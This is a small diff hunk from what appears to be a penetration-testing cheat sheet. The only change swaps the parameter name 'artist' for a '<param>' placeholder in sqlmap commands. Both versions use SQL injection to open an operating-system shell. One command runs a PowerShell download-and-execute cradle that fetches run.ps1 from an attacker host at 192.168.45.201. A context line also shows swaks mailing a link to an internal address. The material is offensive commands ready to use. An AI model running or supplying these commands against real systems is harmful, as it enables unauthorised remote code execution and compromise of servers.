@@ -152,8 +152,8 @@ sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168
 
 #### SQLmap (OS-Shell) 
 ```bash 
-sqlmap -r post.req -p artist --os-shell
-sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
+sqlmap -r post.req -p <param> --os-shell
+sqlmap -r post.req -p <param> --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
 ```
 <br>
 <br>
